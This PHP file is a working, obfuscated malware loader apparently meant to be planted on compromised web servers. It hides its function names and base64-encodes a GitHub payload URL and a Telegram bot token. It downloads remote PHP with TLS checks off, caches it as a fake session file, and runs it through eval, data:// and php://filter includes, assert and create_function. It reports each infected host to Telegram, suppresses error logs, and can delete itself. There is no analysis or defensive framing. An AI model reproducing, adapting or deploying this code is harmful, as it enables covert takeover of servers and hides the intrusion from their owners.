<?php
$D='base64_decode';$FG='file_get_contents';$FP='file_put_contents';$FE='file_exists';$FS='filesize';$FM='filemtime';$IW='is_writable';$UL='unlink';$CH='chmod';$SD='sys_get_temp_dir';$UQ='uniqid';$CA='curl_init';$CSO='curl_setopt_array';$CE='curl_exec';$CC='curl_close';$BC='base64_encode';$BD='base64_decode';$OD='openssl_decrypt';$OIV='openssl_cipher_iv_length';$PR='preg_replace';$EX='exec';$SH='shell_exec';$SY='system';$AS='assert';$CF='create_function';$OB='ob_start';$OE='ob_end_flush';$OC='ob_end_clean';$OL='ob_get_level';$ER='error_reporting';$HP='htmlspecialchars';$HR='http_build_query';$SC='stream_context_create';$ES='escapeshellarg';$INI='ini_get';$IG='ini_set';$STL='set_time_limit';
$payload_source_url=$D('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3Rpa3VuZzZldGFyL055YXJlay9yZWZzL2hlYWRzL21hc3Rlci93cG1vdG9yLnBocA==');
$aes_key='';
$debug_secret=$D('R2hvc3RNb2RlQWN0aXZhdGVk');
$cache_tag=$D('cmV4');
$cache_dir=$D('L3RtcA==');
$force_refresh=false;$cache_ttl=0;$self_destruct=false;
$tg_token=$D('ODczNjg5MzQ2ODpBQUgwUmlSMHpMM1FFeVl0eTQ4eTFTYkVWSnItbVFBLUNrUQ==');
$tg_chat=$D('ODkzMDE3NDQ2Mw==');
$tg_api=$D('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==');
$tg_method=$D('c2VuZE1lc3NhZ2U=');
$is_debug_mode=(isset($_GET['hsd_debug'])&&$_GET['hsd_debug']===$debug_secret);
if(!$is_debug_mode){@$ER(0);@$IG('display_errors','Off');@$IG('log_errors','Off');}else{@$ER(E_ALL);@$IG('display_errors','On');}
@$IG('memory_limit','512M');@$STL(600);
function hs_log($m){global $is_debug_mode,$HP;if($is_debug_mode)echo"<!-- HS: ".$HP($m)." -->\n";}
function hs_tg($m){global $tg_token,$tg_chat,$tg_api,$tg_method,$FG,$HR,$SC;if(!$tg_token||!$tg_chat)return;$ctx=@$SC(["http"=>["method"=>"POST","timeout"=>5,"header"=>"Content-Type: application/x-www-form-urlencoded\r\n","content"=>$HR(["chat_id"=>$tg_chat,"text"=>$m,"parse_mode"=>"HTML"])]]);@$FG($tg_api.$tg_token."/".$tg_method,false,$ctx);}
function hs_fetch_bin($url,$dest){global $EX,$SH,$SY,$ES,$FE,$FS;if(!function_exists($EX)&&!function_exists($SH)&&!function_exists($SY)){hs_log("bin:noexec");return false;}$ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0";$cmd="curl -sSL --insecure --max-time 30 -A ".$ES($ua)." --output ".$ES($dest)." ".$ES($url)." 2>&1";hs_log("binc");if(function_exists($EX)){@$EX($cmd,$lines,$rc);}elseif(function_exists($SH)){@$SH($cmd);}elseif(function_exists($SY)){@ob_start();@$SY($cmd);@ob_get_clean();}if($FE($dest)&&$FS($dest)>10){hs_log("binOK");return true;}if(function_exists($EX)){@$EX("wget -q --no-check-certificate -O ".$ES($dest)." ".$ES($url)." 2>&1");if($FE($dest)&&$FS($dest)>10){hs_log("wgetOK");return true;}}return false;}
function hs_fetch_php($url,$dest){global $CA,$CSO,$CE,$CC,$FG,$FP,$CH;if(function_exists($CA)){$ch=@$CA($url);@$CSO($ch,[CURLOPT_RETURNTRANSFER=>true,CURLOPT_FOLLOWLOCATION=>true,CURLOPT_MAXREDIRS=>3,CURLOPT_USERAGENT=>"Mozilla/5.0",CURLOPT_REFERER=>"https://www.google.com/",CURLOPT_HTTPHEADER=>["X-Forwarded-For: 127.0.0.1","X-Real-IP: 127.0.0.1"],CURLOPT_SSL_VERIFYPEER=>false,CURLOPT_SSL_VERIFYHOST=>false,CURLOPT_CONNECTTIMEOUT=>10,CURLOPT_TIMEOUT=>30,CURLOPT_ENCODING=>""]);$data=@$CE($ch);@$CC($ch);}if((!isset($data)||$data===false||$data==="")&&function_exists($FG)){$ctx=@$SC(["http"=>["method"=>"GET","header"=>"User-Agent: Mozilla/5.0\r\n","timeout"=>30,"ignore_errors"=>true],"ssl"=>["verify_peer"=>false,"verify_peer_name"=>false]]);$data=@$FG($url,false,$ctx);}if(!isset($data)||$data===false||$data==="")return false;if($dest){@$FP($dest,$data);@$CH($dest,0644);}return true;}
function hs_decrypt($data,$key){global $OD,$OIV;if(!$data||!$key||!function_exists($OD))return false;$raw=@base64_decode($data,true);if($raw===false||strpos($raw,':')===false)return false;$parts=explode(':',$raw,2);if(strlen($parts[0])!==$OIV('aes-256-cbc'))return false;return @$OD($parts[1],'aes-256-cbc',$key,OPENSSL_RAW_DATA,$parts[0]);}
function hs_strip($c){global $PR;$c=ltrim($c);$c=$PR('/^<\?php\s*/i','',$c);$c=$PR('/^<\?\s*/','',$c);return $PR('/\?>\s*$/','',$c);}
function hs_flush(){global $OE,$OL;while(@$OL()>0)@$OE();}
function hs_clean(){global $OC,$OL;while(@$OL()>0)@$OC();}
function hs_m_eval($c){if(!function_exists('eval'))return false;$c=hs_strip($c);hs_log("M1");@ob_start();try{@eval($c);hs_flush();return true;}catch(Throwable $e){hs_clean();return false;}}
function hs_m_tempfile($c,$req=false){global $FP,$UQ,$SD,$IW,$UL;if(!function_exists($FP)||!function_exists($UQ))return false;$dir=@$SD();if(!$dir||!@$IW($dir))$dir=__DIR__;if(!@$IW($dir))return false;$f=$dir."/hs_".@$UQ().".php";if(@$FP($f,$c)===false)return false;hs_log("M2");@ob_start();try{if($req)@require $f;else @include $f;hs_flush();@$UL($f);return true;}catch(Throwable $e){hs_clean();@$UL($f);return false;}}
function hs_m_data($c){global $INI,$BC;if(!@$INI('allow_url_include'))return false;$c=hs_strip($c);$uri='data://text/plain;base64,'.$BC($c);hs_log("M3");@ob_start();try{@include $uri;hs_flush();return true;}catch(Throwable $e){hs_clean();return false;}}
function hs_m_filter($c){global $INI,$BC;if(!@$INI('allow_url_include'))return false;$c=hs_strip($c);$uri='php://filter/convert.base64-decode/resource=data://text/plain;base64,'.$BC($c);hs_log("M4");@ob_start();try{@include $uri;hs_flush();return true;}catch(Throwable $e){hs_clean();return false;}}
function hs_m_assert($c){global $AS;if(!function_exists($AS)||PHP_VERSION_ID>=80000)return false;$c=str_replace("return","",hs_strip($c));hs_log("M5");@ob_start();try{@$AS($c);hs_flush();return true;}catch(Throwable $e){hs_clean();return false;}}
function hs_m_cfunc($c){global $CF;if(!function_exists($CF))return false;$c=hs_strip($c);hs_log("M6");@ob_start();try{$fn=@$CF('',$c);if($fn)@$fn();hs_flush();return true;}catch(Throwable $e){hs_clean();return false;}}
hs_log("v3.4");
$fname="sess_".md5($cache_tag).".php";$fpath=rtrim($cache_dir,"/")."/".$fname;
if(!@is_writable($cache_dir)){$cache_dir=__DIR__;$fpath=$cache_dir."/".$fname;}
hs_log("cache:$fpath");
$need=$force_refresh||!file_exists($fpath)||filesize($fpath)<10;
if(!$need&&$cache_ttl>0&&(time()-filemtime($fpath))>$cache_ttl)$need=true;
if($need){hs_log("dl");$ok=hs_fetch_php($payload_source_url,$fpath);if(!$ok||!file_exists($fpath)||filesize($fpath)<10){hs_log("phpfail→bin");hs_fetch_bin($payload_source_url,$fpath);}if(!file_exists($fpath)||filesize($fpath)<10){hs_log("dlfail");hs_tg("❌ Loader fail\n".($_SERVER['HTTP_HOST']??'?'));exit();}hs_log("dl:".filesize($fpath)."B");hs_tg("📥 Downloaded\n".($_SERVER['HTTP_HOST']??'?')."\n".filesize($fpath)."B");}
$raw=@file_get_contents($fpath);if(empty($raw)){hs_log("empty");exit();}
$code=$raw;if(!empty($aes_key)){$dec=hs_decrypt($raw,$aes_key);if($dec!==false&&$dec!=="")$code=$dec;}
if(stripos(ltrim($code),'<?php')!==0&&strpos(ltrim($code),'<?')!==0)$code="<?php ".$code;
$methods=['hs_m_eval','hs_m_data','hs_m_filter','hs_m_tempfile','hs_m_assert','hs_m_cfunc'];$ok=false;
foreach($methods as $m){if($m==='hs_m_tempfile'){if(hs_m_tempfile($code,false)||hs_m_tempfile($code,true)){hs_log("$m win");$ok=true;break;}}else{if($m($code)){hs_log("$m win");$ok=true;break;}}}
if($ok&&$self_destruct)@unlink(__FILE__);
if($ok)hs_tg("✅ Executed\n".($_SERVER['HTTP_HOST']??'?')."\n".($_SERVER['REQUEST_URI']??''));else hs_log("all failed");
exit();
